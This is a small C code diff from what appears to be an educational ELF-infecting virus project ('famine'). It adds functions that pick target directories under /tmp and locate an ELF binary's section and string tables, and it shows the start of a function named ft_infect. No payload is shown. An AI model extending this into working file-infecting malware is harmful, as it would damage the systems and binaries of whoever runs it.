@@ -2,6 +2,24 @@
 
 #include "../incl/famine.h"
 
+char    *ft_setdir(int i)
+{
+    if (i == 0)
+        return ("/tmp/test");
+    else
+        return ("/tmp/test2");
+}
+
+void    ft_pointer_strings_table(t_famine *famine)
+{
+    famine->strtab = (char *)(famine->elf + famine->sectab[famine->header->e_shstrndx].sh_offset);
+}
+
+void    ft_pointer_section_table(t_famine *famine)
+{
+    famine->sectab = (Elf64_Shdr *)(famine->elf + famine->header->e_shoff);
+}
+
 void    ft_infect(t_famine *famine)
 {
     munmap(famine->elf, famine->file_size);
